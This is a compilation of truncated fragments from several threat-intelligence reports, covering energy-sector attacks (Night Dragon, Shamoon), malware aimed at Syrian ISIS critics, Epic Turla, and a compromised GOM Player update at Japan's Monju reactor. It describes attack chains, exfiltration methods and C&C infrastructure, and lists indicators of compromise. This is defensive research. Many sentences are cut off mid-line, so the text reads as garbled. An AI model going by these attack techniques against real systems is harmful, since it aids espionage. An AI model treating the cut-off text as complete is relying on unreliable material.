This minimized the collateral damage at other facilities and showed that the attackers had in - depth knowledge
Night Dragon
Operation Night Dragon , which was uncovered in 2010 , is a typical example of global oil companies being
The attackers started by compromising public facing Web servers through SQL injection and installing Web
Page 11
Targeted Attacks Against the Energy Sector
On compromised computers a common Backdoor . Trojan was installed that communicated back to the
C&C server , allowing remote access to the computer . This allowed the attacker to find and extract valuable
Shamoon / Disttrack
In August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil
The dropper component is responsible for creating all the required files on the system , registering a service
The wiper component is only activated when a hardcoded configuration date has been passed . This enables a
The reporter component is responsible for sending back a HTTP GET request to the C&C server . It reports the
By acquiring user credentials and gaining access to the domain controller the attackers were able to push the
One group that claimed responsibility for the attack posted on Pastebin that it was an anti - oppression hacker
True or not , this shows that it is not necessarily only state - sponsored attackers who are carrying out disruptive
Soon after this attack became known , a Qatari gas company was attacked in a similar way .
Page 12
A spear phishing
Targeted Attacks Against the Energy Sector
Spear phishing attacks in the energy sector
Spear phishing is , along with watering hole attacks , one of the most common attack vectors used to
A spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website .
Such emails are sent in bulk to a handful of key users . These waves are often repeated till enough people fall for
New Year ’s campaign
Some of the spear phishing campaigns are smaller in scale and are focused on specific targets . For example , on
January 1 , 2013 a global energy research company was targeted .
A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted
Whether there was a second wave of emails using the other half of the alphabet or whether the attackers only
All emails had either the subject line “ 2013,Obama QE4 ! Merry Christmas ! ” or “ 2013,Obama QE4 ! ” . It is
Trojan . Dropper disguised as an attachment with the filename AVP.dll .
The malware itself drops a malicious Downloader “ clbcatq.dll ” into a newly created “ wuauclt ” directory , posing
A week later , on January 7 , 2013 , the group attacked the same company again . Seventy emails were sent to
After this second wave , the attack ceased . It is unknown if the attackers successfully retrieved the information
Greek oil campaign
A global oil company , with offices around the world , had been under continuous attack for some time , but in
September 2012 we noticed an upsurge in activity , with 34 times more suspicious emails than on average . This
In total , 136 email accounts at the oil company were targeted . A regional sales manager in Greece received
Page 14
Targeted Attacks Against the Energy Sector
The spear phishing emails came from 234 spoofed addresses . They were made to appear to be linked to the
The emails all contained malicious attachments . None of them linked to third party sites for drive - by downloads .
Of the attachments , 1,588 had a .exe extension . Of those , 842 had a .pdf.exe extension . The malware chosen
The social engineering messages concentrated mainly around the following two themes :
E - books and newspapers :
Free desktop tools :
Once installed , the back door would create a registry run key in order to restart with Windows and connect to
Page 15
Targeted Attacks Against the Energy Sector
The chosen names of the C&C server domains imitates legitimate services in a bid to be overlooked by the system
The back door provides full remote access to the compromised computers , allowing for extraction of any data . It is
Motivation and origin
As with all targeted attacks , there are many different groups of attackers operating in this field . These attacks can not
The attackers tend to go after valuable information , including maps of new gas fields or research on efficient
The same information can be used to carry out sabotage attacks designed to disrupt ICSs , as the energy sector is
For example , in January 2013 a group claiming to be related to Anonymous posted access details for what they said
Disgruntled employees are also a source of attacks that should not be underestimated . With their knowhow about
Page 16
Targeted Attacks Against the Energy Sector
Protection and mitigation
For all regular client computers , the well - established best practice guidelines apply . These computers are often
The company can perform penetration testing on Web and network applications but also on ICSs to identify and
Companies can monitor the Internet for information about attacks in the same vertical and apply lessons learned
In addition , different layers of security products can help achieve better overall protection .
For example failed login attempts on internal servers could indicate a password breach . This includes logging of
Industrial control systems ( ICS ) should be specially protected and monitored . The control system and control
Page 17
In the second
Targeted Attacks Against the Energy Sector
Conclusion
Cyberespionage campaigns and sabotage attacks are becoming increasingly common , with countless threat
In the second half of 2012 , the energy sector was the second most targeted with 16 percent of all the targeted
The attackers tend to go after valuable information – such as maps of a new gas field – but the sector is also
Fortunately , there have not been many successful sabotage attacks against energy companies to date . However ,
Page 19
Targeted Attacks Against the Energy Sector
Appendix
A. Spear phishing
Social engineering themes used
Social engineering is an essential part of spear phishing campaigns . A cleverly chosen , enticing message may prompt
Others try to appeal to personal hobbies in order to get the user ’s attention .
In the energy sector the most commonly used theme for spear phishing emails was money related ( e.g. “ Wage Data
As an example , the subject line “ Wage Data 2012 ” was used in 944 emails , sent from 26 different email addresses
Word document in every instance .
In general any topic can be used in a social engineering attempt , which makes it even harder for regular users to spot
Contact detail updates :
Event and conference details :
Global news stories :
Money related :
Sport related :
Lifestyle related :
Page 21
Targeted Attacks Against the Energy Sector
Special interest groups :
Spear phishing attack details
In the last six month of 2012 the average
In the first six month of 2013 the average
The government and public sector was
On average we saw
Overall , we see a
Figure 3 : Top 10 of targeted attacks by vertical sectors
Page 22
Targeted Attacks Against the Energy Sector
Attachment types used
Half of all the attachments
Of all attachments analyzed ,
Word documents using some exploit to execute custom code on the computer .
There were also some more exotic
Sometimes even older exploits like
Length Record Remote Code
Execution Vulnerability ( CVE-
Figure 5 : Extensions used in targeted attack emails
Page 23
Targeted Attacks Against the Energy Sector
B. Visualization with TRIAGE
To identify a series of targeted attacks that are likely performed by the same individuals , we have used a novel attack
Symantec analysts can then quickly and more efficiently attribute various waves of cyberattacks to a specific attack
Figure 6 : Graph view of attack wave against company targeted in the New Year ’s campaign
The TRIAGE framework was recently enhanced with novel visualizations   thanks to VIS - SENSE , a European research
Page 24
Targeted Attacks Against the Energy Sector
Figure 7 : Visualization graph of the Greek oil campaign
Since its original conception ,   TRIAGE has been
C. Phases of targeted attacks
As with any other targeted attacks , attacks against
Figure 8 : Typical phases of targeted attacks
Page 25
Targeted Attacks Against the Energy Sector
Reconnaissance phase
During this phase the attacker tries to learn as much as possible about the targeted organization .
Information sources often include social networks , job posting sites and press releases . This enables the attacker
Incursion phase
The actual break - in occurs during this phase . The attacker usually compromises the network by delivering targeted
Some groups carefully plan watering hole attacks . For example the Hidden Lynx group stopped using a zero - day
For more difficult targets , man - in - the - middle attacks can be used . These can be performed either at the same
The malware used is not always sophisticated . Sometimes a regular off - the - shelf back door Trojan is used . In
Discovery phase
Once the attacker has a foothold on one system , the next step is to create a plan for lateral movement through the
One of the obvious tasks performed by attackers is to install key loggers , dump local credentials , search local
Often small scripts or even manual commands are used to comb through local files and create network mappings .
Simple system commands can help the attacker to learn about installed security tools , saved links to internal
Page 26
Targeted Attacks Against the Energy Sector
Once new systems are identified the
One method which is gaining more
Windows Update , in the case of
Flamer . Once the attackers have
If the target is assumed to be in a separated network not connected to the Internet , the malware used might try and
At the end of the discovery phase the attackers should know the internals of the infected networks and have
Capture / exfiltration phase
The capture and exfiltration phases are not always present . If the sole goal of the attackers is to cause a disruption
In this phase the interesting data is gathered and sent back to the attackers . This can be done with different levels of
In addition to this , the amount of data sent and the timing can be chosen in a smart way . For example , some malware
Internet , such as from a Wi - Fi hotspot at an airport . This might allow the traffic to bypass perimeter security and
Disruption phase
This is when any destructive payload is launched . If the attackers are only after information this phase might not
In recent times , wiper Trojans have been popular in attacks against the energy sector . The malware deletes all files
Page 27
Targeted Attacks Against the Energy Sector
Resources
Sep 2011 .
Jungle : A Closer Look at 419 Scam Email Operations .   International Workshop on Cyber Crime ( IWCC 2013 ) ,
Targeted Attacks : Understanding the Characteristics of an Escalating Threat . In Proc . Of the 15th
International conference on   Research in Attacks , Intrusions , and Defenses ( RAID ) , 2012 .
Page 28
Author
Candid Wueest
Principal Software Engineer
About Symantec
Symantec protects the world ’s information and is the
Our innovative products and services protect people and
Our industry - leading expertise in protecting data ,
Follow us on Twitter                                                                            Headquartered in Mountain View , Calif. ,
More information is available at www.symantec.com .
Visit our Blog
For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters                                                                                   Copyright © 2014 Symantec Corporation . All
Mountain View , CA 94043 USA                                                                                   registered trademarks of Symantec Corporation
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation .
Malware Attack Targeting Syrian ISIS Critics
With the collaboration of Cyber Arabs .
Media coverage : Associated Press , Forbes
Summary
This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria . In the interest of
A Syrian citizen media group critical of Islamic State of Iraq and Syria ( ISIS ) was recently targeted in a
Silently ( RSS ) , focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar-
Raqah . In response , ISIS forces in the city have reportedly targeted the group with house raids , kidnappings , and an
Though we are unable to conclusively attribute the attack to ISIS or its supporters , a link to ISIS is
Background : Citizen Journalists under Threat in ISIS - controlled Territories
As the Syrian Civil War continues , Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe
Map : Raqqah is indicated by the red arrow . Colors indicate areas mostly under the control of the following groups :
Black = ISIS , Red = Syrian Regime , Green = Free Syrian Army , Yellow = Kurdish . Note : the map is not highly detailed ,
Ar - Raqqah , the city in which the case study is located , is situated in northern Syria and continues to be a key conflict
Raqqah from regime forces . As ISIS gained momentum , they consolidated their control over the city , edging out FSA-
Information Control by ISIS
During 2014 , there were a number of reports — many unconfirmed — that ISIS confiscated smartphones and laptops from
As ISIS cements their control of Ar - Raqqah and other territories , reports have emerged recently ( though not all of them
The Situation of Nonviolent Activists and Citizen Journalists in Ar - Raqqah
Nonviolent activists and citizen journalists based in Ar - Raqqah have provided the outside world with much of what we
As ISIS continues to use social media to push the message that it is welcomed by the population of Ar - Raqqah , groups like
Raqqah is being Slaughtered Silently ( RSS ) provide a compelling counter narrative . RSS hasn’t escaped ISIS’ notice , and
Image 1 : Example of an online threat made against RSS . The image , which can not be confirmed , purports to show CCTV
In addition , RSS is targeted online by ISIS supporters with harassment , including threats to the physical safety of its
Analyzing the Attack
This section describes a highly targeted attack sent to an e - mail address belonging to RSS . The Citizen Lab analyzed this
The attack took the form of an unsolicited e - mail containing a download link to a decoy file . The file
The Targeting of RSS
The unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address . The message
Targeting Email
Thank you for your efforts to deliver a true picture of the reality of life in Raqqah . As Syrians residing in Canada we are
You can see a preliminary copy of the report on this linkhttp://tempsend [ DOT]com/[Redacted]With all respect
Original Arabic
We are unsure why the attacker specifically mentions Canada in the email lure . However , it is well known that Syria ’s
Syria . Thus , the message is not on its face implausible . However , we note that the attacker also attempts to social
Analyzing the Malware
The custom malware used in this attack infects a user who views the decoy “ slideshow , ” and beacons home with the IP
Unlike Syrian regime - linked malware , it contains no Remote Access Trojan ( RAT ) functionality ,
Further , because the malware sends data captured by the malware to an e - mail address , it does not require that the
Narrative of Infection
Accessing the link provided in the malicious e - mail sends the user to a .zip file hosted on file - sharing site
Image 2 : Tempsend screenshot
The file to be downloaded is “ slideshow.zip ”
This file contains slideshow.exe
This file is a self - extracting archive with an icon intended to suggest to the victim that it is itself a slideshow .
When run , the file opens a slideshow of Google Earth screen captures to the victim , displaying a series of locations in
Syria , and highlighting an “ ISIS HQ ” and other images showing the alleged locations of US airstrikes .
Examples of images in the slideshow as follows :
Infection and Data Collection
When opened , the “ slideshow.zip ” file writes and executes several files :
The AdobeR1 file writes a series of executable files that perform information collection and communication functions ,
Program Sequence
The program sequence of data collection and sending is somewhat unusual , with each program performing a single task
First , the program nvidrv adds itself to autorun :
It also creates a series of registry keys that the individual programs use to communicate :
Registry keys and programs using them :
Sets name “ 1 ” to StartupInfo structure as a string , e.g. “ 0x3110x611 ”
It then runs GooglUpd , which cleans up the program files if they exist , and runs AdbrRader . AdbrRader
Next , nvidrv runs GoogleUpate , which collects system information and writes it to :
Then nvidrv runs nvisdvr ( registry key “ 4 ” ) that collects a list of running processes , which are written to :
Finally , nvidrv runs svhosts , which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com .
It then runs rundl132 if it has not before , by checking whether registry key name “ 6 ” is present . It sets the key to “ 0 ” and
Next , “ rundl132.exe ” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected
Host : myexternalip.com
Cache - Control : no - cacheHTTP/1.1 200 OK
Server : nginx/1.6.2
Content - Type : text / html ; charset = utf-8
Transfer - Encoding : chunked
Connection : close
Date : [ REDACTED ]
My - External - Ip : [ REDACTED]f
Next , rundl132 writes :
Then rundl132 writes the external IP to :
Finally , rundl132 runs AdobeIns , which zips the contents of the win32.tmp folder .
Program “ AdobeIns.exe ” takes the files written by the other programs and zips them in an encrypted , password-
Data Transmission
Data is transmitted by e - mail to an account presumably controlled by the attacker .
Date : [ REDACTED ]
From : < [ REDACTED]@inbox.com >
X - Priority : 3 ( Normal )
To : < [ REDACTED]@inbox.com >
Subject : repo
Content - Type : multipart / mixed ; boundary=”__MESSAGE__ID__[REDACTED]”–__MESSAGE__ID__[REDACTED ]
Content - type : text / plain ; charset = US - ASCII
Content - Transfer - Encoding : 7bitHello
Content - Type : application / x - msdownload ; name=”mxtd ”
Content - Transfer - Encoding : base64
Content - Disposition : attachment ; filename=”mxtd”[REDACTED]–__MESSAGE__ID__[REDACTED]–.
Evaluation of the Malware ’s Functionality
The malware seen in this case study is unusual as it relies on a half - dozen separate executable files , each with a
The malware is also interesting because it does not provide remote access , but only sends an e - mail containing
By not providing remote access and other RAT functionality , the program looks less like malware , and may attract less
Transmitting the malware via e - mail also provides a degree of obscurity , and has the additional advantage of providing a
The malware transmits autonomously , leaving the material in an inbox for the attacker to collect at a later time .
The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows .
Nevertheless , we believe that the author of the program is aware of certain techniques to reduce the visibility of malware
In addition , the malware uses the old PKWARE implementation of zip encryption , which is not particularly secure . The
Targeted Threats Index
Citizen Lab researchers have developed the Targeted Threat Index ( TTI ) as a tool to standardize information about the
This attack , which has little technical sophistication ( i.e. , it uses no exploits , code obfuscation , or techniques to frustrate
Attribution
There are at least three possible sources for this malware attack :
Pro - regime / regime - linked malware groups
Other , unknown actors
We evaluate each of these possibilities in turn , drawing on the information available to us after almost three years of
Pro - Regime / Regime - Linked Groups
Pro - regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011 .
Those campaigns have been extensively reported on by a range of groups , including Kaspersky , FireEye , Citizen Lab , the
Electronic Frontier Foundation , and many others . Regime - linked malware has a number of common features that
Social engineering focusing on the needs and interests of the opposition . Although targeted , the malware seeding
Use of widely available RATs ( njRAT , Xtreme Rat , ShadowTech Rat , DarkComet RAT , and Blackshades RAT , among
At least one command - and - control server located within Syrian IP space ( often from a limited range of addresses ) .
Frequent use of Dynamic DNS providers like no - ip .
Use of “ crypters ” to obscure the binary .
These characteristics are not all present in every sample , but we have typically found one or more in almost every binary
This malware attack differs from known regime - linked groups in each of these elements . Not only is it
We are aware of only one previous case in Syria in which e - mail was used to transmit data , and that we believed was
The lack of overlap in Tactics , Techniques , and Procedures ( TTPs ) between this attack and prior attacks does not rule out
Syrian regime - linked attackers . It is possible that regime - linked groups are trying a new approach . However , given that
We think there are several features of the malware attack that align with the needs and constraints of
The malware beacons location but does not provide RAT functionality .
The seeding attempts to obtain a ‘ private’ Facebook identity from RSS through social engineering .
The malware exfiltrates to an online e - mail account , thus not requiring the attacker to maintain a command - and-
The social media activity of members of RSS is often highly public . Their location and exact membership , however , is
Raqqah ( and it is also possible that they have the ability to operate in some capacity in border areas of Turkey ) .
Little is publicly known about the technical capabilities of ISIS and its supporters ; however , reports have begun to emerge
Other Unknown Actors
It is possible that the attack is the product of actors working for unknown purposes and targeting RSS . Given the activities
It is likely that third party actors , including several intelligence services , are closely monitoring various actors in the
Conclusion : ISIS Ca n’t Be Ruled Out
After considering each possibility , we find strong but inconclusive circumstantial evidence to support a
We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its
Whether or not ISIS is responsible , this attack is likely the work of a non - regime threat actor who may be just beginning to
Attacks Targeting Civil Society
Citizen Lab research into targeted digital threats against civil society confirms that civil society groups
The case highlighted here is no exception : lack of IT and security resources have made it difficult for the Syrian opposition
Warning : Social Engineering Thrives in Syrian Context
This attack was exceptionally targeted , and clearly reflected the work of an actor familiar with the operations of the
This particular attack can be prevented by not opening files sent by unknown persons . However , many
This attack reaffirms the dangers posed by social engineering attacks , whether they deliver phishing campaigns or
Even if the link to ISIS turns out to be incorrect , it is possible that this will be a threat in the future .
Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very
Indicators of Compromise
The malware files
Filename                                             MD5
Files dropped by the malware
Filename and Path                                                        MD5
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
C:\Users\
Collected Information Files ( unencrypted )
Filename and Path
Exfiltrated file ( encrypted )
Filename and Path
Registry Keys
Filename and Path
Acknowledgements
Acknowledgements : We are grateful to Cyber Arabs and the Institute for War and Peace Reporting for their critical work
Special thanks to : several anonymous Syrians , Masashi Crete - Nishihata , Sarah McKune , Morgan Marquis - Boire , Ron
Deibert , Bill Marczak , Nart Villeneuve , Irene Poetranto , and Kristen Dennesen .
Support for this research is provided by grants from the John D. and Catherine T. MacArthur Foundation and the Ford
Foundation .
Footnotes
The most recent Citizen Lab report on this topic is Communities @ Risk , which details a four - year long study of targeted
The Epic Turla Operation
Technical Appendix with IOCs
Executive Summary
Over the last 10 months , Kaspersky Lab researchers have analyzed a massive cyber - espionage operation
The attacks are known to have used at least two zero - day exploits :
We also observed exploits against older ( patched ) vulnerabilities , social engineering techniques and
When G - Data published on Turla / Uroburos back in February , several questions remained unanswered .
One big unknown was the infection vector for Turla ( aka Snake or Uroburos ) . Our analysis indicates that
Carbon / Cobra system . Sometimes , both backdoors are run in tandem , and used to " rescue " each other if
Once the attackers obtain the necessary credentials without the victim noticing , they deploy the rootkit
The attacks are still ongoing as of July 2014 , actively targeting users in Europe and the Middle East .
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
The Epic Turla attacks
The attacks in this campaign fall into several different categories depending on the vector used in the
Spearphishing e - mails with Adobe PDF exploits ( CVE-2013 - 3346 + CVE-2013 - 5065 )
Social engineering to trick the user into running malware installers with " .SCR " extension ,
Watering hole attacks using Java exploits ( CVE-2012 - 1723 ) , Flash exploits ( unknown ) or Internet
Explorer 6,7,8 exploits ( unknown )
Watering hole attacks that rely on social engineering to trick the user into running fake " Flash
Player " malware installers
The attackers use both direct spearphishing and watering hole attacks to infect their victims . Watering
So far we haven't been able to locate any e - mail used against the victims , only the attachments . The PDF
Some of known attachment names used in the spearphishing attacks are :
Note_№107 - 41D.pdf
Talking Points.scr
Security protocol.scr
In some cases , these filenames can provide clues about the type of victims the attackers are targeting .
The watering hole attacks
Currently , the Epic attackers run a vast network of watering holes that target visitors with surgical
Some of the injected websites include :
The website of the City Hall of Pinor , Spain
A site promoting entrepreneurship in the border area of Romania
Palestinian Authority Ministry of Foreign Affairs
In total , we observed more than 100 injected websites . Currently , the largest number of injected sites is in
Romania .
Here 's a statistic on the injected websites :
The distribution is obviously not random , and it reflects some of the interests of the attackers . For
Most of the infected sites use the TYPO3 CMS ( see : http://typo3.org/ ) , which could indicate the attackers
Injected websites load a remote JavaScript into the victim 's browser :
The script " sitenavigatoin.js " is a Pinlady - style browser and plugin detection script , which in turn ,
Profiling script
The main exploitation script " wreq.php " , " main.php " or " main.jpg " performs a numbers of tasks . We have
One version of this script attempts to exploit Internet Explorer versions 6 , 7 and 8 :
Internet Explorer exploitation script
Unfortunately , the Internet Explorer exploits have not yet been retrieved .
Another more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player :
Java and Flash Player exploitation scripts
Although the Flash Player exploits could n't be retrieved , we did manage to obtain the Java exploits :
Name                MD5
The Java files exploit a popular vulnerability , CVE-2012 - 1723 , in various configurations .
The payload dropped by these Java exploits is the following :
The Java exploit use a special loader that attempts to inject the final Epic backdoor payload into
This C&C is still online at the moment although it redirects to a currently suspended page at
The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what
Flash Player ( MD5 : 030f5fdb78bfc1ce7b459d3cc2cf1877 ) :
In at least one case , they tried to trick the user into downloading and running a fake Microsoft Security
Essentials app ( MD5 : 89b0f1a3a667e5cd43f5670e12dba411 ) :
The fake application is signed by a valid digital certificate from Sysprint AG :
Serial number : 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint : 24 21 58 64 f1 28 97 2b 26
Valid signature from Sysprint AG on Epic dropper
This file was distributed from the Ministry of Foreign Affairs of Tajikistan 's website , at
The file is a .NET application that contains an encrypted resource . This drops the malicious file with the
This is an Epic backdoor which connects to the following C&Cs , with a generic internal ID of 1156fd22-
A full list with all the C&C server URLs that we recovered from the samples can be found in the technical
Appendix .
The Epic command - and - control infrastructure
The Epic backdoors are commanded by a huge network of hacked servers that deliver command and
The huge network commanded by the Epic Turla attackers serves multiple purposes . For instance , the
Here 's how the big picture looks like :
Epic Turla lifecycle
The first level of command and control proxies generally talk to a second level of proxies , which in turn ,
We were able to get a copy of one of the motherships , which provided some insight into the operation .
It runs a control panel which is password protected :
Epic mothership control panel login
Once logged into the Control panel , the attackers can see a general overview of the system including the
Epic control panel status overview
A very interesting file on the servers is task.css , where the attackers define the IP ranges they are
It should be noted though , the fact that the attackers were targeting these ranges does n't necessarily mean
There is also an " except.css " file where attackers log the reasons they did n't try to exploit certain visitors .
There are three possible values :
These are the " do n't meet the conditions " reasons observed in the logs :
Windows 7 or 2008 R2
Mozilla/4.0 ( compatible ; MSIE 8.0 ; Windows NT 6.1 ; WOW64 ; Trident/4.0 ; SLCC2 ; .NET CLR
Adobe Shockwave 11.5.1.601
Adobe Flash 10.3.181.14
Adobe Reader 10.1.0.0
Win Media Player 12.0.7601.17514
Quick Time null
Java null
The Epic / Tavdig / Wipbot backdoor
For this first stage of the attack , the threat actor uses a custom backdoor . In some cases , the backdoor is
The CVE-2013 - 5065 exploit allows the backdoor to achieve administrator privileges on the system and run
Other known detection names for the backdoor is Trojan . Wipbot ( Symantec ) or Tavdig .
The main backdoor is about 60 KB in size and implements a C&C protocol on top of normal HTTP
C&C through the same channel .
The malware behavior is defined by a configuration block . The configuration block usually contains two
The configuration can also be updated on the fly by the attackers , via the C&C.
The backdoor attempts to identify the following processes and , if found , it will terminate itself :
It contains an internal unique ID , which is used to identify the victim to the C&C. Most samples , especially
During the first C&C call , the backdoor sends a pack with the victim 's system information . All further
Through monitoring , we were able to capture a large amount of commands sent to the victims by the
Once a victim is infected and " checks in " with the server , the attackers send a template of commands :
Next , the attackers try to move through the victim 's network using pre - defined or collected passwords :
Listing all .doc files recursively is also a common " theme " :
In total , we have decoded several hundreds of these command packages delivered to the victims , providing
In addition to generic searches , some very specific lookups have been observed as well . These include
In this case , the attackers were interested to find e - mails related to " NATO " , " Energy Dialogue within
European Unition " and so on .
For some of the C&C servers , the attackers implemented RSA encryption for the C&C logs , which makes it
Lateral movement and upgrade to more sophisticated backdoors
Once a victim is compromised , the attackers upload several tools that are used for lateral movement .
One such tool observed in the attacks and saved as " C:\Documents and Settings\All users\Start
Name : winsvclg.exe
Compiled : Tue Oct 02 13:51:50 2012
This is a keylogger tool that creates % temp%\~DFD3O8.tmp . Note : the filename can change across
In addition to these custom tools , we observed the usage of standard administration utilities . For instance ,
Name : winrs.exe
This is an UPX packed binary , which contains the genuine " dnsquery.exe " tool from Microsoft , unpacked
In several cases , an interesting update has been observed -- a malware from a different , yet related family .
Size : 275,968 bytes
Compiled : Thu Nov 08 11:05:35 2012
Size : 218,112 bytes
Compiled : Thu Nov 08 11:04:39 2012
This backdoor is more sophisticated and belongs to the next level of cyber - espionage tools called the
Decoded configuration for e9580b6b13822090db018c320e80865f
Note : the command and control servers www.losguayaberos[.]com and
Other packages delivered to the victims include :
These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to
The Turla Carbon dropper from these packages has the following properties :
This is called internally by the authors " Carbon System " , part of the " Cobra " project , as it can be seen from
This acts as a dropper for the following modules , both 32 and 64 bit :
The Carbon system is in essence an extensible platform , very similar to other attack platforms such as the
Tilded platform or the Flame platform . The plugins for the Carbon system can be easily recognized as they
Carbon system plugin with characteristic exports
Several Epic backdoors appear to have been designed to work as Carbon system plugins as well - they
Some modules have artifacts which indicate the Carbon system is already at version 3.x , although the
The author of the Carbon module above can be also seen in the code , as " gilg " , which also authored several
We are planning to cover the Turla Carbon system with more details in a future report .
Language artifacts
The payload recovered from one of the mothership servers ( at
The word " Zagruzchick " means " boot loader " in Russian .
The Control panel for the Epic motherships also sets the language to codepage " 1251 " :
Codepage 1251 is commonly used to render Cyrillic characters .
There are other indications that the attackers are not native English language speakers :
Password it´s wrong !
Count successful more MAX
File is not exists
File is exists for edit
The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an
The threat actor behind the " Epic " operation uses mainly hacked servers to host their proxies . The hacked
The MD5 " af3e8be26c63c4dd066935629cf9bac8 " has been solved by Kaspersky Lab as the
Once again , it is also interesting to point out the usage of Codepage 1251 in the webshell , which is used to
There appears to be several links between Turla and Miniduke , but we will leave that for a future blogpost .
Victim statistics
On some of the C&C servers used in the Epic attacks , we were able to identify detailed victim statistics ,
This is the country distribution for the top 20 affected countries by victim 's IP :
According to the public information available for the victims ' IPs , targets of " Epic " belong to the following
Government
Ministry of interior ( EU country )
Ministry of trade and commerce ( EU country )
Ministry of foreign / external affairs ( Asian country , EU country )
Intelligence ( Middle East , EU Country )
Embassies
Military ( EU country )
Education
Research ( Middle East )
Pharmaceutical companies
Unknown ( impossible to determine based on IP / existing data )
Summary
When G - Data published their Turla paper , there were few details publicly available on how victims get
Most recently , we observed this attack against a Kaspersky Lab user on August 5 , 2014 , indicating the
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
We would like to add the following at the end of the blogpost , right before the detection names :
Further reading
If you 'd like to read more about Turla / Uroburos , here 's a few recommendations :
G - Data 's paper " Uroburos Highly complex espionage software with Russian roots "
Kaspersky products ' detection names for all the malware samples described in this post :
Backdoor . Win32.Turla.an
Backdoor . Win32.Turla.ao
Exploit . JS.CVE-2013 - 2729.a
Exploit . JS.Pdfka.gkx
Exploit . Java . CVE-2012 - 1723.eh
Exploit . Java . CVE-2012 - 1723.ou
Exploit . Java . CVE-2012 - 1723.ov
Exploit . Java . CVE-2012 - 1723.ow
Exploit . Java . CVE-2012 - 4681.at
Exploit . Java . CVE-2012 - 4681.au
Exploit . MSExcel . CVE-2009 - 3129.u
Rootkit . Win32.Turla.d
Trojan - Dropper . Win32.Dapato.dwua
Trojan - Dropper . Win32.Demp.rib
Trojan - Dropper . Win32.Injector.jtxs
Trojan - Dropper . Win32.Injector.jtxt
Trojan - Dropper . Win32.Injector.jznj
Trojan - Dropper . Win32.Injector.jznk
Trojan - Dropper . Win32.Injector.khqw
Trojan - Dropper . Win32.Injector.kkkc
Trojan - Dropper . Win32.Turla.b
Trojan - Dropper . Win32.Turla.d
Trojan . HTML.Epiccosplay.a
Trojan . Win32.Agent.iber
Trojan . Win32.Agent.ibgm
Trojan . Win32.Agentb.adzu
Trojan . Win32.Inject.iujx
Trojan . Win32.Nus.g
Trojan . Win32.Nus.h
Technical Appendix with IOCs
Context Threat Intelligence
Threat Advisory
The Monju Incident
Context Ref .    TA10009
Author          Context Threat Intelligence ( CTI )
Date            27/01/2014
Tel             + 44 ( 0 ) 20 7537 7515
Fax             + 44 ( 0 ) 20 7537 1071
Email           threat@contextis.co.uk
E
Contents
Context Information Security distribute Context Threat Intelligence ( CTI ) reporting under
The various levels of the TLP are represented by the following colours :
Sources may use TLP : RED when information can not be effectively acted upon by
Recipients may not share TLP : RED information with any parties outside of the specific
Sources may use TLP : AMBER when information requires support to be effectively acted
Recipients may only share TLP : AMBER information with members of their own
Sources may use TLP : GREEN when information is useful for the awareness of all
Recipients may share TLP : GREEN information with peers and partner organisations within
Sources may use TLP : WHITE when information carries minimal or no foreseeable risk of
Subject to standard copyright rules , TLP : WHITE information may be distributed freely ,
On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in
Japan noticed suspicious connections emanating from a machine in the control room ,
Among other items , staff training documents and more than 40,000 emails were stored
Energy Agency is investigating further .
The attack appears to have been the result of the attackers having compromised the
Korea and in some parts of Asia it is a popular alternative to Windows Media Player . It is
Technical analysis of the implant on the compromised machine has shown it to be a
In order to inform the Energy Sector and beyond about this attack , we have compiled a
Compromise ( IOCs ) which can be used to aid detection . It is likely that the attackers
Based on open source reporting , it appears that the intrusion took place via the
The observed malicious activity relates to the modification of a file that controls GOM
Player updates , spanning the date range 27th December 2013 to 16th January 2014 ,
The modified file redirected the GOM Player update process to another compromised
Modified
Update URL
Upd ate Requ est
Malware
Victim                           3                                                         www.fudousankaitori.jp
Malware Command
And Control
Key
Compromised Server
Attacker Infrastructure                                                                  testqweasd.tk
A diagram illustrating the modified flow of the GOM Player update process which led to the compromise
Deployed to the system via a compressed bundle containing the official GOM Player
The installer component is referred to by the author as ‘ miansha ' which , according to an
East Asia Cyber Threat Intelligence Researcher , is likely Miǎnshā ( 免杀 ) , a phrase
Windows Version :
Miancha Persistence Registry Keys
Windows Vista and later                      HKEY_USERS\.default\Software\Classes\CLSID\{ECD4FC4D-
Prior to Windows Vista                       HKEY_USERS\.default\Software\Classes\CLSID\{B12AE898-
D056 - 4378-A844 - 6D393FE37956}\InProcServer32\@ =
The installer will also determine the system architecture ( 32- or 64-bit ) and then
Repackaged Update
Real GOM Player Installer         Self - extracting RAR Archive containing Malware
Obfuscated Malware Loaders
Malicious Installer
Obfuscated Implant Code
The deployment chain of the Miancha Gh0st variant
The main implant code is stored in files named instructions.pdf and instructions64.pdf ;
Analysis of this malware revealed it to be a variant of the Gh0st RAT , often used by
Chinese actors ( including those who are state - motivated or directly state - sponsored ) .
This specific variant shows similarities to that used during the VOHO campaign[4 ] , where
In addition to delivering system - specific details back to the attacker , Gh0st RAT provides
To enable rapid response , the following Snort signature can be deployed :
Additionally , the following Yara signature should identify both encoded payloads and
Size ( bytes )             13314
Compile Time             2013 - 11 - 22 12:19:48 UTC
In - the - wild Filenames    install.exe
Obfuscated TrojanLoader : W32/Gh0stMiancha
Size ( bytes )             10299
Compile Time             N / A
In - the - wild Filenames    dll.tmp
